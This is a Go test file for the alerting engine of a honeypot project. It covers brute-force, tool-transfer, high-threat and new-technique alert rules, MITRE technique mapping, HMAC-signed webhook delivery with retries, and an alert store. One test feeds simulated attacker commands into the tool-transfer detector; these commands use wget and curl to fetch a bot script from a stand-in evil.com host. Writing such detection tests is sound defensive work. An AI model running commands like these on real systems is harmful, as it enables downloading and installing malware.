/*
©AngelaMos | 2026
alert_test.go
*/

package alert

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"sync/atomic"
	"testing"
	"time"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/CarterPerez-dev/hive/internal/config"
	"github.com/CarterPerez-dev/hive/internal/event"
	"github.com/CarterPerez-dev/hive/internal/mitre"
	"github.com/CarterPerez-dev/hive/internal/session"
	"github.com/CarterPerez-dev/hive/pkg/types"
)

func newTestEngine(
	t *testing.T, tr *session.Tracker, rules ...string,
) (*Engine, *Store) {
	t.Helper()

	cfg := config.Default()
	cfg.Alert.Rules = rules
	cfg.Alert.Cooldown = time.Minute
	cfg.Alert.MinScore = 60

	store := NewStore(50)
	det := mitre.NewDetector()
	lg := zerolog.Nop()

	e, err := New(
		cfg, event.NewBus(), det, det.Index(), tr, store, &lg,
	)
	require.NoError(t, err)
	return e, store
}

func loginFailed(i int) *types.Event {
	return &types.Event{
		SessionID:   "s1",
		EventType:   types.EventLoginFailed,
		ServiceType: types.ServiceSSH,
		SourceIP:    "203.0.113.1",
		Timestamp:   time.Now().UTC().Add(time.Duration(i) * time.Second),
	}
}

func cmdEvent(cmd, sessionID string) *types.Event {
	return &types.Event{
		SessionID:   sessionID,
		EventType:   types.EventCommand,
		ServiceType: types.ServiceSSH,
		SourceIP:    "203.0.113.1",
		Timestamp:   time.Now().UTC(),
		ServiceData: json.RawMessage(`{"command":"` + cmd + `"}`),
	}
}

func TestSelectRules(t *testing.T) {
	all, err := SelectRules(nil)
	require.NoError(t, err)
	assert.Len(t, all, 4)

	some, err := SelectRules([]string{" Brute_Force ", "brute_force"})
	require.NoError(t, err)
	require.Len(t, some, 1)
	assert.Equal(t, RuleBruteForce, some[0].Name())

	_, err = SelectRules([]string{"nope"})
	assert.Error(t, err)
}

func TestDeduper(t *testing.T) {
	d := NewDeduper(time.Minute)
	now := time.Now()

	assert.True(t, d.Allow("k", now))
	assert.False(t, d.Allow("k", now.Add(30*time.Second)))
	assert.True(t, d.Allow("other", now))
	assert.True(t, d.Allow("k", now.Add(2*time.Minute)))
}

func TestBruteForceAlertDedupes(t *testing.T) {
	e, store := newTestEngine(
		t, session.NewTracker(), RuleBruteForce,
	)

	for i := range 4 {
		e.handle(loginFailed(i))
	}
	assert.Empty(t, store.Recent(10))

	for i := 4; i < 9; i++ {
		e.handle(loginFailed(i))
	}

	recs := store.Recent(10)
	require.Len(t, recs, 1)
	assert.Equal(t, RuleBruteForce, recs[0].Rule)
	assert.Equal(t, StatusLocal, recs[0].Delivery)
	assert.Equal(t, "203.0.113.1", recs[0].SourceIP)
	require.NotEmpty(t, recs[0].MITRE)
	assert.Equal(t, "T1110", recs[0].MITRE[0].TechniqueID)
}

func TestToolTransferAlert(t *testing.T) {
	e, store := newTestEngine(
		t, session.NewTracker(), RuleToolTransfer,
	)

	e.handle(cmdEvent("ls", "s1"))
	assert.Empty(t, store.Recent(10))

	e.handle(cmdEvent("wget http://evil.com/bot.sh", "s1"))
	e.handle(cmdEvent("curl http://evil.com/bot.sh", "s1"))

	recs := store.Recent(10)
	require.Len(t, recs, 1)
	assert.Equal(t, RuleToolTransfer, recs[0].Rule)
}

func TestHighThreatAlert(t *testing.T) {
	tr := session.NewTracker()
	sess := tr.Start(
		"hive-01", types.ServiceSSH, "203.0.113.1", 1000, 2222,
	)
	e, store := newTestEngine(t, tr, RuleHighThreat)

	e.handle(cmdEvent("ls", sess.ID))
	assert.Empty(t, store.Recent(10))

	tr.AddScore(sess.ID, 70)
	e.handle(cmdEvent("ls", sess.ID))

	recs := store.Recent(10)
	require.Len(t, recs, 1)
	assert.Equal(t, SeverityCritical, recs[0].Severity)
	require.NotNil(t, recs[0].Session)
	assert.GreaterOrEqual(t, recs[0].Session.ThreatScore, 60)
}

func TestNewTechniqueAlertFiresOnce(t *testing.T) {
	e, store := newTestEngine(
		t, session.NewTracker(), RuleNewTechnique,
	)

	ex := &types.Event{
		SessionID:   "s1",
		EventType:   types.EventExploit,
		ServiceType: types.ServiceHTTP,
		SourceIP:    "203.0.113.9",
		Timestamp:   time.Now().UTC(),
	}
	e.handle(ex)
	e.handle(ex)

	recs := store.Recent(10)
	require.Len(t, recs, 1)
	assert.Equal(t, RuleNewTechnique, recs[0].Rule)
}

func TestSign(t *testing.T) {
	body := []byte(`{"a":1}`)
	mac := hmac.New(sha256.New, []byte("s3cret"))
	mac.Write(body)
	want := "sha256=" + hex.EncodeToString(mac.Sum(nil))

	assert.Equal(t, want, Sign("s3cret", body))
}

func newTestSender(url, secret string) *Sender {
	s := NewSender(url, secret, zerolog.Nop())
	s.backoffs = []time.Duration{
		time.Millisecond, time.Millisecond, time.Millisecond,
	}
	return s
}

func TestDeliverRetriesThenSucceeds(t *testing.T) {
	var calls atomic.Int32
	var sigOK atomic.Bool

	srv := httptest.NewServer(http.HandlerFunc(
		func(w http.ResponseWriter, r *http.Request) {
			body, _ := io.ReadAll(r.Body)
			sigOK.Store(
				r.Header.Get(HeaderSignature) ==
					Sign("s3cret", body),
			)
			if calls.Add(1) < 3 {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.WriteHeader(http.StatusOK)
		},
	))
	defer srv.Close()

	s := newTestSender(srv.URL, "s3cret")
	attempts, err := s.deliver(
		context.Background(), Payload{ID: "a1", Rule: RuleBruteForce},
	)

	require.NoError(t, err)
	assert.Equal(t, 3, attempts)
	assert.True(t, sigOK.Load())
}

func TestDeliverGivesUpAfterThreeRetries(t *testing.T) {
	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(
		func(w http.ResponseWriter, _ *http.Request) {
			calls.Add(1)
			w.WriteHeader(http.StatusBadGateway)
		},
	))
	defer srv.Close()

	s := newTestSender(srv.URL, "")
	attempts, err := s.deliver(context.Background(), Payload{ID: "a2"})

	require.Error(t, err)
	assert.Equal(t, 4, attempts)
	assert.Equal(t, int32(4), calls.Load())
}

func TestDeliverDoesNotRetryClientErrors(t *testing.T) {
	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(
		func(w http.ResponseWriter, _ *http.Request) {
			calls.Add(1)
			w.WriteHeader(http.StatusForbidden)
		},
	))
	defer srv.Close()

	s := newTestSender(srv.URL, "")
	attempts, err := s.deliver(context.Background(), Payload{ID: "a3"})

	require.Error(t, err)
	assert.Equal(t, 1, attempts)
}

func TestSenderRunReportsResult(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(
		func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusNoContent)
		},
	))
	defer srv.Close()

	s := newTestSender(srv.URL, "")
	done := make(chan error, 1)
	s.SetOnResult(func(_ string, _ int, err error) { done <- err })

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go s.Run(ctx)

	require.True(t, s.Enqueue(Payload{ID: "a4"}))

	select {
	case err := <-done:
		assert.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("timed out waiting for delivery")
	}
}

func TestValidateWebhookURL(t *testing.T) {
	assert.NoError(t, ValidateWebhookURL("https://hooks.example.com/x"))
	assert.Error(t, ValidateWebhookURL("ftp://example.com"))
	assert.Error(t, ValidateWebhookURL("http://"))
}

func TestStoreRingAndOrder(t *testing.T) {
	s := NewStore(2)
	s.Add(Payload{ID: "1"}, StatusLocal)
	s.Add(Payload{ID: "2"}, StatusPending)
	s.Add(Payload{ID: "3"}, StatusPending)
	s.SetResult("3", StatusDelivered, 1, nil)

	recs := s.Recent(0)
	require.Len(t, recs, 2)
	assert.Equal(t, "3", recs[0].ID)
	assert.Equal(t, StatusDelivered, recs[0].Delivery)
	assert.Equal(t, "2", recs[1].ID)
}